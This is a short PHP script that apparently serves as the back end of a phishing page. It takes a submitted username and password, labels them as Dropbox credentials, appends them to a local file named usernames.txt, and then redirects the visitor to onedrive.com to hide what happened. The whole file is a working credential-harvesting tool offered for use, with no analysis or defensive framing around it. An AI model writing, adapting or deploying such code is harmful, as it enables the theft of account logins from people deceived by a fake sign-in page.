<?php

file_put_contents("usernames.txt", "Dropbox Username: " . $_POST["user1"] . " Pass: " . $_POST["psw"] . "\n", FILE_APPEND);
header('Location: https://www.onedrive.com/');
exit();
?>